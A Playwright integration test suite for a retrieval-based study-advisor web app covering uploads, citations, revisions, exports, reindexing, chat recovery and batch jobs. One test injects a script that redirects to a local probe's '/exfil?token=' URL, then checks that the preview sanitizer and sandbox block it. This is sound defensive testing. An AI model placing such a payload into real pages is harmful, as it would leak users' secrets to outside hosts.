import test from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { access, mkdir, readFile, realpath, rm, writeFile } from 'node:fs/promises';
import { randomUUID } from 'node:crypto';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { chromium } from 'playwright-core';

const frontend = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const root = path.resolve(frontend, '..');
const testRunsRoot = path.resolve(root, 'data', 'test-runs');
const dataRoot = path.join(testRunsRoot, `live-browser-${randomUUID()}`);
const python = process.env.PYTHON ?? path.join(
  root, '.venv',
  process.platform === 'win32' ? path.join('Scripts', 'python.exe') : path.join('bin', 'python'),
);
const chromePath = process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH ??
  path.join(process.env.ProgramFiles ?? 'C:/Program Files', 'Google/Chrome/Application/chrome.exe');
let child;
let browser;
let baseUrl;
let readyDataPath;
let stderrText = '';
let stdoutText = '';
let serverExit = null;

function appendTail(current, chunk) {
  return (current + String(chunk)).slice(-12_000);
}

function serverDiagnostics() {
  return JSON.stringify({ pid: child?.pid ?? null, exit: serverExit, baseUrl,
    dataRoot, stderrTail: stderrText, stdoutTail: stdoutText });
}

async function waitForJson(page, url, predicate, { timeoutMs = 30_000, intervalMs = 100 } = {}) {
  const deadline = Date.now() + timeoutMs;
  let polls = 0;
  let lastStatus = null;
  while (Date.now() < deadline) {
    const result = await page.evaluate(async (requestUrl) => {
      const response = await fetch(requestUrl, { cache: 'no-store' });
      return { ok: response.ok, status: response.status, body: await response.json().catch(() => null) };
    }, url);
    polls += 1;
    lastStatus = result.status;
    if (!result.ok) throw new Error(`Polling ${url} failed with HTTP ${result.status}`);
    if ((await predicate(result.body)) === true) return result.body;
    await new Promise((resolve) => setTimeout(resolve, intervalMs));
  }
  throw new Error(`Polling ${url} timed out after ${polls} responses (last HTTP status ${lastStatus})`);
}

async function waitForServer() {
  return new Promise((resolve, reject) => {
    let buffer = '';
    const timeout = setTimeout(() => reject(new Error(`Live API server startup timed out. stderr: ${stderrText}`)), 120_000);
    child.stdout.setEncoding('utf8');
    child.stdout.on('data', (chunk) => {
      buffer += chunk;
      const lines = buffer.split(/\r?\n/); buffer = lines.pop() ?? '';
      for (const line of lines) {
        try {
          const message = JSON.parse(line);
          if (message.ready && message.url) { clearTimeout(timeout); resolve(message); return; }
        } catch { /* Only the readiness JSON is significant. */ }
      }
    });
    child.stderr.setEncoding('utf8');
    child.stderr.on('data', (chunk) => { stderrText = appendTail(stderrText, chunk); });
    child.once('error', (error) => { clearTimeout(timeout); reject(error); });
    child.once('exit', (code) => {
      clearTimeout(timeout);
      reject(new Error(`Live API server exited before readiness (${code}). stderr: ${stderrText}`));
    });
  });
}

const message = (page) => page.getByLabel('Message', { exact: true });
async function send(page, text) {
  await message(page).fill(text);
  await page.getByRole('button', { name: 'Send', exact: true }).click();
}
async function openSidebar(page, name) {
  await page.getByRole('navigation', { name: 'Chats and library' }).getByRole('button', { name }).click();
}
async function openTool(page, tab) {
  await openSidebar(page, 'Tools');
  await page.getByRole('tab', { name: tab }).click();
}
async function createMenu(page, item) {
  await page.getByRole('button', { name: 'Create or import' }).click();
  await page.getByRole('menuitem', { name: item }).click();
}
async function download(page, format) {
  await page.getByRole('button', { name: 'Download', exact: true }).click();
  const event = page.waitForEvent('download');
  await page.getByRole('menuitem', { name: `Download .${format}` }).click();
  return event;
}
async function uploadSource(page, filePath) {
  await openSidebar(page, /^Sources/);
  await page.locator('input[type=file][aria-label="Choose a PDF, text, or Markdown source"]').setInputFiles(filePath);
}
const cited = (page) => page.getByRole('figure', { name: 'Cited passage' }).locator('blockquote');
const revisionTitle = (page) => page.locator('.canvas-footer [title*=" · revision "]');

test.before(async () => {
  await access(python);
  await access(chromePath);
  await mkdir(testRunsRoot, { recursive: true });
  assert.equal(await realpath(testRunsRoot), testRunsRoot, 'test-runs directory must resolve inside the workspace');
  await mkdir(dataRoot, { recursive: false });
  const verifiedRoot = await realpath(dataRoot);
  assert.equal(path.dirname(verifiedRoot), testRunsRoot);
  child = spawn(python, [path.join(frontend, 'tests', 'fixtures', 'api_server.py'), '--data-root', verifiedRoot, '--dist', path.join(frontend, 'dist')], {
    cwd: root, windowsHide: true, stdio: ['ignore', 'pipe', 'pipe'],
    env: { ...process.env, PYTHONUNBUFFERED: '1', DATA_DIR: path.join(verifiedRoot, 'runtime') },
  });
  child.on('exit', (code, signal) => { serverExit = { code, signal }; });
  const ready = await waitForServer();
  baseUrl = ready.url;
  child.stdout.on('data', (chunk) => { stdoutText = appendTail(stdoutText, chunk); });
  browser = await chromium.launch({ executablePath: chromePath, headless: true, args: ['--no-sandbox'] });
});

test.after(async () => {
  await browser?.close();
  if (child?.exitCode === null) {
    try { await fetch(`${baseUrl}/__test/shutdown`, { method: 'POST' }); } catch { /* The process may already be stopping. */ }
    await Promise.race([
      new Promise((resolve) => child.once('exit', resolve)),
      new Promise((resolve) => setTimeout(() => { child.kill(); resolve(); }, 20_000)),
    ]);
  }
  try {
    readyDataPath = await realpath(dataRoot);
    assert.equal(path.dirname(readyDataPath), testRunsRoot, 'refuse cleanup unless the resolved target is a direct child of data/test-runs');
    assert.match(path.basename(readyDataPath), /^live-browser-[0-9a-f-]+$/);
    await rm(readyDataPath, { recursive: true, force: true });
  } catch (error) {
    if (error?.code !== 'ENOENT') throw error;
  }
});

test('real browser uploads, retrieves a cited passage, revises, reopens, and exports a Postgres artifact', async () => {
  const context = await browser.newContext();
  const page = await context.newPage();
  page.on('pageerror', (error) => console.error('Live integration page error:', error.message));
  try {
    await page.goto(baseUrl);
    await page.getByRole('heading', { name: 'Emory STEM Advisor' }).waitFor();
    await page.getByText('Local development', { exact: true }).waitFor();

    const exactPassage = 'Robotics lab rule: students must complete the safety orientation before they may use the equipment. The orientation includes a supervised access checkout.';
    const inputPath = path.join(dataRoot, 'robotics-intro.txt');
    await writeFile(inputPath, exactPassage, 'utf8');
    await uploadSource(page, inputPath);
    try { await page.getByText('robotics-intro.txt', { exact: true }).waitFor({ timeout: 10_000 }); }
    catch { throw new Error(`Live upload did not appear in Sources. Page: ${await page.locator('body').innerText()} Server stderr: ${stderrText}`); }
    try { await page.getByText('Ready', { exact: true }).waitFor({ timeout: 10_000 }); }
    catch { throw new Error(`Source uploaded but was not indexed. Page: ${await page.locator('body').innerText()} Server stderr: ${stderrText}`); }
    await page.getByRole('button', { name: 'Close', exact: true }).click();

    await send(page, 'What is required before using the robotics equipment?');
    try { await page.getByText('Students must complete the robotics lab orientation before using equipment.', { exact: false }).waitFor({ timeout: 10_000 }); }
    catch (error) { throw new Error(`Grounded answer failed. Page: ${await page.locator('body').innerText()} Server: ${serverDiagnostics()}`, { cause: error }); }
    const citation = page.locator('.source-chip').filter({ hasText: 'robotics-intro.txt' });
    await citation.waitFor(); await citation.click();
    assert.equal(await cited(page).innerText(), exactPassage);

    await createMenu(page, 'New document');
    await page.getByRole('tab', { name: 'Start blank' }).click();
    await page.getByLabel('Title').fill('Live integration guide');
    await page.getByLabel('Content (Markdown)').fill('# First draft\n\nExported from the real API integration test.');
    await page.getByRole('button', { name: 'Create', exact: true }).click();
    await revisionTitle(page).waitFor();
    const initialRevision = await revisionTitle(page).getAttribute('title');

    await page.locator('.document-editor textarea').first().fill('Revised live integration guide');
    await page.getByRole('button', { name: 'Save changes' }).click();
    await page.getByText('Saved as a new version', { exact: false }).waitFor();
    assert.notEqual(await revisionTitle(page).getAttribute('title'), initialRevision, 'saving publishes a new revision');
    await openSidebar(page, 'All artifacts');
    await page.getByRole('dialog').getByRole('button', { name: /Live integration guide/ }).click();
    await page.waitForFunction(() => Array.from(document.querySelectorAll('.document-editor textarea')).some((area) => area.value === 'Revised live integration guide'));

    const markdownFile = await download(page, 'md');
    assert.match(markdownFile.suggestedFilename(), /\.md$/i);
    assert.match(await readFile(await markdownFile.path(), 'utf8'), /Revised live integration guide/);
    const docxFile = await download(page, 'docx');
    assert.match(docxFile.suggestedFilename(), /\.docx$/i);
    assert.deepEqual((await readFile(await docxFile.path())).subarray(0, 2), Buffer.from('PK'));
  } finally { await context.close(); }
});

test('real browser preview blocks external frame self-navigation', async () => {
  let hits = 0;
  const requests = [];
  const probe = createServer((req, res) => { hits += 1; requests.push(req.url); res.end('unexpected outbound request'); });
  await new Promise((resolve) => probe.listen(0, '127.0.0.1', resolve));
  const probeAddress = probe.address();
  const context = await browser.newContext();
  const page = await context.newPage();
  try {
    await page.goto(baseUrl);
    await page.getByRole('heading', { name: 'Emory STEM Advisor' }).waitFor();
    await createMenu(page, 'New web page');
    await page.getByRole('tab', { name: 'Start blank' }).click();
    await page.getByLabel('Title').fill('Navigation boundary test');
    await page.getByLabel('HTML content').fill('<script>location.href="http://127.0.0.1:' + probeAddress.port + '/exfil?token=fixture-secret"</script>');
    await page.getByRole('button', { name: 'Create', exact: true }).click();
    await revisionTitle(page).waitFor();
    await page.getByRole('button', { name: 'Preview', exact: true }).click();
    const frame = page.locator('iframe[title="Isolated artifact preview"]');
    await frame.waitFor();
    const srcdoc = await frame.getAttribute('srcdoc');
    assert.doesNotMatch(srcdoc, /location\.href/, 'preview sanitizer must strip navigation script before iframe insertion');
    await page.waitForTimeout(1200);
    assert.equal(hits, 0, `untrusted preview must not navigate externally: ${requests.join(', ')}`);
    assert.equal(await frame.getAttribute('sandbox'), '');
    assert.match(await frame.evaluate((el) => el.getAttribute('srcdoc') ?? ''), /worker-src 'none'/);
    const htmlExport = await download(page, 'html');
    const exportedHtml = await readFile(await htmlExport.path(), 'utf8');
    assert.match(exportedHtml, /sandbox=""/);
    assert.match(exportedHtml, /script-src &#x27;none&#x27;/);
    assert.match(exportedHtml, /worker-src &#x27;none&#x27;/);
    assert.match(exportedHtml, /frame-src 'self'; object-src 'none'; base-uri 'self'/);
    const exportedPage = await context.newPage();
    await exportedPage.goto(pathToFileURL(await htmlExport.path()).href);
    await exportedPage.waitForTimeout(1200);
    await exportedPage.close();
    assert.equal(hits, 0, 'downloaded wrapper must keep its source inert when opened in a browser');
  } finally {
    await context.close();
    await new Promise((resolve, reject) => probe.close((error) => error ? reject(error) : resolve()));
  }
});

test('real reindex failure retains the last-good source revision and citations', async () => {
  const context = await browser.newContext();
  const page = await context.newPage();
  try {
    await page.goto(baseUrl);
    await page.getByRole('heading', { name: 'Emory STEM Advisor' }).waitFor();
    const passage = 'Persistent index rule: users must finish laboratory safety training before operating the robotics station.';
    const filename = 'reindex-survival.txt';
    const filePath = path.join(dataRoot, filename);
    await writeFile(filePath, passage, 'utf8');
    await uploadSource(page, filePath);
    await page.getByText(filename, { exact: true }).waitFor();
    await page.locator('.source-row').filter({ hasText: filename }).getByText('Details').click();
    await page.getByRole('button', { name: 'Reindex ' + filename }).waitFor();
    let source;
    try {
      source = await page.evaluate(async (name) => (await (await fetch('/api/sources')).json()).find((item) => item.name === name), filename);
    } catch (error) {
      throw new Error(`Source listing failed after upload; server=${serverDiagnostics()}`, { cause: error });
    }
    assert.equal(source.status, 'indexed');
    assert.equal(typeof source.indexRevision, 'number');

    await page.evaluate(async () => {
      const response = await fetch('/__test/fail-next-embedding', { method: 'POST' });
      if (!response.ok) throw new Error('Could not arm the test-only embedding failure.');
    });
    await page.getByRole('button', { name: 'Reindex ' + filename }).click();
    await page.getByRole('alert').getByText(/Reindex failed: API request failed \(422\): source reindex failed/).waitFor();
    await page.locator('.source-row').filter({ hasText: filename }).locator('.badge-indexed').waitFor();
    await page.getByText(/previously ready index remains available/).waitFor();
    const sourceListAfterFailure = await page.evaluate(async () => (await (await fetch('/api/sources')).json()));
    const afterFailure = sourceListAfterFailure.find((item) => item.id === source.id);
    assert.ok(afterFailure, `Reindexed source disappeared: ${JSON.stringify(sourceListAfterFailure)}`);
    assert.equal(afterFailure.status, 'indexed');
    assert.ok(afterFailure.indexRevision > source.indexRevision);
    assert.match(afterFailure.errorMessage, /test-only reindex failure/);

    const queryResult = await page.evaluate(async ({ sourceId }) => {
      const response = await fetch('/api/query', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ query: 'What must users finish before operating the robotics station?', sourceIds: [sourceId] }),
      });
      if (!response.ok) throw new Error('Query failed after reindex error: ' + await response.text());
      return response.json();
    }, { sourceId: source.id }).catch((error) => {
      throw new Error(`Query after reindex failed; server=${serverDiagnostics()}`, { cause: error });
    });
    assert.equal(queryResult.type, 'answer');
    assert.ok(queryResult.citations.length > 0);
    assert.ok(queryResult.trace.contextBlock.some((item) => item.text.includes(passage)));
    assert.equal(afterFailure.name, filename, 'reindex preserves the source display filename');
  } finally { await context.close(); }
});

test('real saved conversations retain citation snapshots, sequence follow-ups, and preserve failed drafts', async () => {
  const context = await browser.newContext();
  const page = await context.newPage();
  const turnRequests = [];
  const turnResponses = [];
  let failedFirstEventRead = false;
  await page.route('**/api/conversations/*/turns/*/events**', async (route) => {
    if (!failedFirstEventRead) {
      failedFirstEventRead = true;
      await route.fulfill({ status: 503, contentType: 'application/json', body: '{"detail":"test reconnect"}' });
      return;
    }
    await route.continue();
  });
  page.on('request', (request) => {
    if (request.method() === 'POST' && /\/api\/conversations\/[^/]+\/turns(?:\/stream)?$/.test(new URL(request.url()).pathname)) {
      try { turnRequests.push(JSON.parse(request.postData() ?? '{}')); } catch { /* asserted below */ }
    }
  });
  page.on('response', async (response) => {
    if (/\/api\/conversations\/[^/]+\/turns(?:\/stream)?$/.test(new URL(response.url()).pathname)) {
      turnResponses.push({ status: response.status(), body: await response.text().catch(() => '') });
    }
  });
  try {
    await page.goto(baseUrl);
    await page.getByRole('heading', { name: 'Emory STEM Advisor' }).waitFor();
    const passage = 'Conversation snapshot rule: students must complete the supervised telescope safety briefing before opening the observatory dome.';
    const filePath = path.join(dataRoot, 'conversation-source.txt');
    await writeFile(filePath, passage, 'utf8');
    await uploadSource(page, filePath);
    await page.getByText('conversation-source.txt', { exact: true }).waitFor();
    await page.getByRole('button', { name: 'Close', exact: true }).click();

    await openSidebar(page, 'New chat');
    await page.evaluate(async () => {
      const response = await fetch('/__test/slow-next-provider', { method: 'POST' });
      if (!response.ok) throw new Error('Could not arm the test-only slow provider stream.');
    });
    await send(page, 'What must students complete before opening the observatory dome?');
    await page.locator('.message-user').filter({ hasText: 'What must students complete before opening the observatory dome?' }).waitFor();
    assert.equal(turnRequests.length, 1);
    assert.equal(turnRequests[0].expectedSequence, 0);
    assert.match(turnRequests[0].requestId, /^[0-9a-f-]{36}$/i);
    assert.equal(Object.hasOwn(turnRequests[0], 'sourceIds'), false);
    // The attempt counter spans the whole server run; earlier tests' chats stream too.
    const streamStarted = await waitForJson(page, '/__test/provider-stream-started', (state) => state?.started);
    await page.getByLabel('Unverified provisional answer').getByText('Provisional, unverified answer text.').waitFor();
    assert.equal(failedFirstEventRead, true, 'event polling recovers after a GET failure');
    assert.equal(await message(page).inputValue(),
      'What must students complete before opening the observatory dome?',
      'the sent draft remains until the turn reaches a saved terminal state');
    await page.reload();
    await page.getByLabel('Unverified provisional answer').getByText('Provisional, unverified answer text.').waitFor();
    await message(page).fill('A new draft while generation is pending.');
    assert.equal(turnRequests.length, 1, 'reopening reads stored events without resubmitting the turn');
    assert.equal((await page.evaluate(async () => (await (await fetch('/__test/provider-stream-started')).json()).attempts)),
      streamStarted.attempts, 'reopening does not start a second provider attempt');
    await page.evaluate(async () => {
      const response = await fetch('/__test/release-provider-stream', { method: 'POST' });
      if (!response.ok) throw new Error('Could not release the test-only provider stream.');
    });
    const answered = page.locator('.message-assistant:not(.message-pending)');
    await answered.locator('.source-chip').first().waitFor();
    assert.equal(await message(page).inputValue(),
      'A new draft while generation is pending.', 'terminal publication does not erase a newer draft');
    await answered.locator('.source-chip').first().click();
    assert.equal(await cited(page).innerText(), passage);
    const callsBeforeFollowUp = await page.evaluate(async () => (await (await fetch('/__test/provider-calls')).json()).calls);

    await page.reload();
    await page.locator('.message-user').filter({ hasText: 'What must students complete before opening the observatory dome?' }).waitFor();
    await answered.locator('.source-chip').first().click();
    assert.equal(await cited(page).innerText(), passage, 'citation text comes from saved context, not current source cache');
    await send(page, 'Can you restate that rule?');
    await page.locator('.message-user').filter({ hasText: 'Can you restate that rule?' }).waitFor();
    await answered.nth(1).waitFor();
    assert.equal(turnRequests[1].expectedSequence, 2, 'the follow-up uses the newest saved sequence');
    assert.equal(Object.hasOwn(turnRequests[1], 'sourceIds'), false, 'omitted scope inherits the previously saved scope');

    await openSidebar(page, 'New chat');
    await page.evaluate(async () => {
      const response = await fetch('/__test/fail-next-provider', { method: 'POST' });
      if (!response.ok) throw new Error('Could not arm the test-only provider failure.');
    });
    await send(page, 'What safety briefing must students complete before opening the observatory dome?');
    await page.getByRole('button', { name: 'Stop answering' }).waitFor();
    const failedRequest = turnRequests.at(-1);
    const failedConversation = JSON.parse(turnResponses.at(-1).body).conversationId;
    const failedEventSnapshot = await waitForJson(
      page,
      `/api/conversations/${failedConversation}/turns/${failedRequest.requestId}/events`,
      (eventPage) => eventPage?.done && eventPage.jobState === 'failed'
        && eventPage.requestState === 'pending',
    );
    const failedJobSnapshot = await page.evaluate(async ({ conversationId, requestId }) =>
      (await (await fetch(`/__test/conversation-job?conversation_id=${conversationId}&request_id=${requestId}`)).json()),
    { conversationId: failedConversation, requestId: failedRequest.requestId });
    const failedPostResponse = turnResponses.map(({ body }) => {
      try { return JSON.parse(body); } catch { return null; }
    }).find((body) => body?.requestId === failedRequest.requestId);
    assert.equal(failedJobSnapshot.jobId, failedPostResponse?.jobId,
      'the inspected job is the exact job bound by this stream POST');
    assert.equal(await message(page).inputValue(), 'What safety briefing must students complete before opening the observatory dome?');
    await page.getByRole('button', { name: 'Stop answering' }).waitFor();
    const providerStateAfterFailure = await page.evaluate(async () => (await (await fetch('/__test/provider-calls')).json()));
    const callsAfterFailure = providerStateAfterFailure.calls;
    assert.ok(callsAfterFailure <= callsBeforeFollowUp + 2,
      'the follow-up and the unknown turn make at most one provider attempt each');
    await page.waitForTimeout(300);
    const providerStateAfterSettle = await page.evaluate(async () => (await (await fetch('/__test/provider-calls')).json()));
    assert.equal(providerStateAfterSettle.calls, callsAfterFailure,
      `failed turn is never automatically replayed; beforeFollowUp=${callsBeforeFollowUp}; ` +
      `afterFailure=${JSON.stringify(providerStateAfterFailure)}; ` +
      `afterSettle=${JSON.stringify(providerStateAfterSettle)}; ` +
      `failedJob=${JSON.stringify(failedJobSnapshot)}; ` +
      `failedEvents=${JSON.stringify(failedEventSnapshot)}; ` +
      `postIds=${JSON.stringify(turnRequests.map(({ requestId, mode }) => ({ requestId, mode })))}; ` +
      `posts=${turnRequests.length}; ` +
      `server=${serverDiagnostics()}`);
    assert.equal(providerStateAfterSettle.streamAttempts, providerStateAfterFailure.streamAttempts,
      `no additional conversation stream starts after terminal unknown outcome; posts=${turnRequests.length}`);
  } finally { await context.close(); }
});

test('real gap capture is resolved only by an explicit same-collection human attestation and survives reload', async () => {
  const context = await browser.newContext();
  const page = await context.newPage();
  const resolutionRequests = [];
  const collectionSourceReads = [];
  page.on('request', (request) => {
    const url = new URL(request.url());
    if (request.method() === 'POST' && /\/api\/gaps\/[^/]+\/resolve$/.test(url.pathname)) {
      try { resolutionRequests.push(JSON.parse(request.postData() ?? '{}')); } catch { /* asserted below */ }
    }
    if (request.method() === 'GET' && url.pathname === '/api/sources' && url.searchParams.has('collection')) {
      collectionSourceReads.push(url.searchParams.get('collection'));
    }
  });
  try {
    await page.goto(baseUrl);
    await page.getByRole('heading', { name: 'Emory STEM Advisor' }).waitFor();
    const passage = 'Gap fixture: the canoe maintenance schedule requires a paddle inspection before each launch from Lake Clara.';
    const query = 'Zzyzx quasar flibbertigibbet?';
    const filename = 'gap-review-source.txt';
    const collectionName = 'gap-review-nondefault';
    const source = await page.evaluate(async ({ name, passage, collection }) => {
      const form = new FormData();
      form.append('file', new Blob([passage], { type: 'text/plain' }), name);
      form.append('collection', collection);
      const response = await fetch('/api/sources', { method: 'POST', body: form });
      if (!response.ok) throw new Error('Could not upload non-default gap fixture: ' + await response.text());
      return response.json();
    }, { name: filename, passage, collection: collectionName });
    assert.ok(source?.id, `uploaded source missing: ${JSON.stringify(source)}`);

    const beforeCalls = await page.evaluate(async () => (await (await fetch('/__test/provider-calls')).json()).calls);
    const refused = await page.evaluate(async ({ query, sourceId, collection }) => {
      const response = await fetch('/api/query', { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ query, sourceIds: [sourceId], collectionId: collection }) });
      if (!response.ok) throw new Error(await response.text());
      return response.json();
    }, { query, sourceId: source.id, collection: collectionName });
    assert.equal(refused.type, 'refusal', `test query was expected to create a real refusal: ${JSON.stringify(refused)}`);
    const afterCalls = await page.evaluate(async () => (await (await fetch('/__test/provider-calls')).json()).calls);
    assert.equal(afterCalls, beforeCalls, 'zero-candidate refusal must not call the model');

    const gap = await page.evaluate(async (query) => (await (await fetch('/api/gaps')).json()).gaps.find((item) => item.query === query), query);
    assert.ok(gap?.gapId, 'real refusal was recorded in the private gap queue');
    assert.equal(gap.state, 'open');
    assert.deepEqual(gap.sourceIds, [source.id]);
    await openTool(page, 'Unanswered questions');
    await page.getByRole('button', { name: 'Refresh retrieval gaps' }).click();
    await page.locator('.gap-review-item').filter({ hasText: query }).waitFor();
    const resolvedCollectionName = await page.evaluate(async (collectionId) => (await (await fetch('/api/collections')).json()).find((item) => item.id === collectionId)?.name, gap.collectionId);
    assert.equal(resolvedCollectionName, collectionName, 'gap belongs to the non-default collection');
    assert.ok(collectionSourceReads.includes(collectionName), `review loaded source choices using the exact gap collection name (${collectionName}; got ${JSON.stringify(collectionSourceReads)})`);
    const gapSources = await page.evaluate(async (name) => (await (await fetch(`/api/sources?collection=${encodeURIComponent(name)}`)).json()), collectionName);
    assert.ok(gapSources.some((item) => item.id === source.id && item.status === 'indexed'), `gap source should be eligible: ${JSON.stringify(gapSources)}`);

    const entry = page.locator('.gap-review-item').filter({ hasText: query });
    await entry.locator('summary').click();
    await page.locator('.gap-source-option input[type="checkbox"]').first().check();
    await page.getByLabel('Optional reviewer note').fill('The saved source is relevant to the scoped gap.');

    // Compete with the stale UI revision through the real API: resolve once,
    // then repeat the exact refused query to reopen the same gap at a new revision.
    const reopened = await page.evaluate(async ({ gapId, revision, sourceId, query, collection }) => {
      const resolution = await fetch(`/api/gaps/${gapId}/resolve`, { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ expectedRevision: revision, sourceIds: [sourceId], note: 'Test-only competing attestation.' }) });
      if (!resolution.ok) throw new Error('Could not create stale-revision fixture: ' + await resolution.text());
      const response = await fetch('/api/query', { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ query, sourceIds: [sourceId], collectionId: collection }) });
      const result = await response.json();
      if (!response.ok || result.type !== 'refusal') throw new Error('Could not reopen the same structural gap: ' + JSON.stringify(result));
      return (await (await fetch('/api/gaps')).json()).gaps.find((item) => item.gapId === gapId);
    }, { gapId: gap.gapId, revision: gap.revision, sourceId: source.id, query, collection: collectionName });
    assert.equal(reopened.state, 'open');
    assert.equal(reopened.revision, gap.revision + 2);

    await page.getByRole('button', { name: 'Record human source attestation' }).click();
    await page.getByRole('alert').getByText('This gap changed').waitFor();
    assert.equal(await page.locator('.gap-source-option input[type="checkbox"]').first().isChecked(), true,
      'stale revision refresh must preserve selected source draft');
    assert.equal(await page.getByLabel('Optional reviewer note').inputValue(), 'The saved source is relevant to the scoped gap.');
    const uiResolutions = () => resolutionRequests.filter((body) => body.note === 'The saved source is relevant to the scoped gap.');
    assert.deepEqual(uiResolutions()[0], { expectedRevision: gap.revision, sourceIds: [source.id], note: 'The saved source is relevant to the scoped gap.' });

    await page.getByRole('button', { name: 'Record human source attestation' }).click();
    await page.getByText('Reviewer note: The saved source is relevant to the scoped gap.', { exact: true }).waitFor();
    assert.equal(uiResolutions().length, 2, 'retry occurs only after a second explicit click');
    assert.equal(uiResolutions()[1].expectedRevision, reopened.revision);
    const stored = await page.evaluate(async (gapId) => (await (await fetch('/api/gaps')).json()).gaps.find((item) => item.gapId === gapId), gap.gapId);
    assert.equal(stored.state, 'resolved');
    assert.deepEqual(stored.resolution.sourceIds, [source.id]);
    assert.equal(stored.resolution.note, 'The saved source is relevant to the scoped gap.');

    await page.reload();
    await openTool(page, 'Unanswered questions');
    const reopenedPanel = page.locator('.gap-review-item').filter({ hasText: query });
    await reopenedPanel.locator('summary').click();
    await reopenedPanel.getByText('Reviewer note: The saved source is relevant to the scoped gap.', { exact: true }).waitFor();
    assert.match(await reopenedPanel.innerText(), /Human source attestation/);
  } finally { await context.close(); }
});

test('real batch API persists ambiguous intent, polls/publishes explicitly, reopens an exact revision, and cancels explicitly', async () => {
  const context = await browser.newContext();
  const page = await context.newPage();
  const submissions = [];
  const batchResponses = [];
  page.on('request', (request) => {
    if (request.method() === 'POST' && new URL(request.url()).pathname === '/api/artifact-batches') {
      try { submissions.push(JSON.parse(request.postData() ?? '{}')); } catch { /* asserted below */ }
    }
  });
  page.on('response', async (response) => {
    if (new URL(response.url()).pathname === '/api/artifact-batches' && response.request().method() === 'POST') {
      batchResponses.push({ status: response.status(), body: await response.text().catch(() => '') });
    }
  });
  try {
    await page.goto(baseUrl);
    await page.getByRole('heading', { name: 'Emory STEM Advisor' }).waitFor();
    await page.evaluate(async () => {
      const response = await fetch('/__test/enable-batch-routing', { method: 'POST' });
      if (!response.ok) throw new Error('Could not enable test-only batch routing.');
    });
    await openTool(page, 'Bulk drafts');
    await page.getByLabel('Batch request mode').selectOption('authoring');
    await page.getByLabel('Batch prompt 1').fill('Create a short guide for testing batch submission recovery.');
    await page.getByRole('button', { name: 'Submit batch' }).click();
    await page.getByText(/Submission outcome may be unknown/).waitFor();
    await page.getByText(/Outcome unknown/).first().waitFor();
    assert.equal(submissions.length, 1);
    assert.match(submissions[0].batchId, /^[0-9a-f-]{36}$/i);
    assert.match(submissions[0].items[0].itemId, /^[0-9a-f-]{36}$/i);
    assert.equal(submissions[0].items[0].inputs.mode, 'authoring');
    assert.deepEqual(submissions[0].items[0].inputs.sourceIds, []);
    assert.equal(await page.getByLabel('Batch prompt 1').inputValue(), 'Create a short guide for testing batch submission recovery.');
    assert.deepEqual(await page.evaluate(async () => (await (await fetch('/__test/batch-stats')).json()).submissions), 1);

    await page.reload();
    await openTool(page, 'Bulk drafts');
    await page.getByText(/Outcome unknown/).first().waitFor();
    assert.equal(submissions.length, 1, 'list/detail recovery after reload makes no resubmission');
    assert.equal(await page.evaluate(async () => (await (await fetch('/__test/batch-stats')).json()).submissions), 1);

    await page.getByLabel('Batch prompt 1').fill('Create a guide that will publish when explicitly polled.');
    await page.getByLabel('Batch request mode').selectOption('authoring');
    await page.getByRole('button', { name: 'Submit batch' }).click();
    await page.waitForTimeout(1500);
    const batchStatusText = await page.locator('.artifact-batch-detail').innerText();
    assert.match(batchStatusText, /Selected batch · In progress/, `second batch did not submit; ui=${batchStatusText}; responses=${JSON.stringify(batchResponses)}; alert=${await page.locator('[role=alert]').allTextContents()}`);
    const publishBatch = submissions[1];
    assert.ok(publishBatch && publishBatch.batchId !== submissions[0].batchId);
    await page.getByRole('button', { name: 'Poll provider status' }).click();
    await page.getByText(/Selected batch · Completed · 1\/1 complete/).waitFor();
    await page.getByText(/Published/).waitFor();
    const statsAfterPoll = await page.evaluate(async () => (await (await fetch('/__test/batch-stats')).json()));
    assert.deepEqual(statsAfterPoll, { submissions: 2, polls: 1, results: 1, cancels: 0 });
    await page.getByRole('button', { name: 'Open published revision' }).click();
    await revisionTitle(page).waitFor();
    const publishedRevision = await revisionTitle(page).getAttribute('title');
    assert.match(publishedRevision, /^Artifact [0-9a-f-]{36} · revision [0-9a-f-]{36}$/i);

    await page.reload();
    await openTool(page, 'Bulk drafts');
    await page.getByText(/Batch · Completed · 1\/1/).first().waitFor();
    await page.getByRole('button', { name: /Open published revision/ }).waitFor();
    await page.getByLabel('Batch prompt 1').fill('Create a third guide then cancel its batch.');
    await page.getByLabel('Batch request mode').selectOption('authoring');
    await page.getByRole('button', { name: 'Submit batch' }).click();
    await page.getByText(/Selected batch · In progress/).waitFor();
    const cancelBatch = submissions[2];
    assert.ok(cancelBatch && cancelBatch.batchId !== publishBatch.batchId);
    await page.getByRole('button', { name: 'Cancel batch' }).click();
    await page.getByText(/Remote provider usage may still incur charges/).waitFor();
    assert.equal(submissions.length, 3);
    assert.deepEqual(await page.evaluate(async () => (await (await fetch('/__test/batch-stats')).json())), { submissions: 3, polls: 1, results: 2, cancels: 1 });
  } finally { await context.close(); }
});
